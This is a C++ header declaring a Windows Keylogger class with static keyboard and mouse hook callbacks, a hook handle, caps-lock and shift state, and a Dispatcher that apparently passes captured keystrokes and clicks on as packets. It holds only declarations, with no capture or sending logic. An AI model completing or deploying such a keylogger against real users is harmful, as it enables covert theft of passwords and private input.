#ifndef _KEYLOGGER_HPP_
# define _KEYLOGGER_HPP_

# include <iostream>
# include <memory>
# include <string>

# include "Dispatcher.hpp"
# include <Windows.h>

# include "APacket.hpp"
# include "KeyStroke.hpp"
# include "MouseClick.hpp"

# define KEYUP 0x80000000
# define KEYDOWN 0x40000000

class Keylogger
{
public:
	static LRESULT CALLBACK handleKey(int code, WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK handleMouse(int code, WPARAM wParam, LPARAM lParam);

	static void setDispatcher(std::shared_ptr<Dispatcher> disp);
private:

	static HINSTANCE					_hInst;
	static HHOOK						_hook;
	static bool							_capsLock;
	static bool							_maj;
	static std::shared_ptr<Dispatcher>	_disp;
};

#endif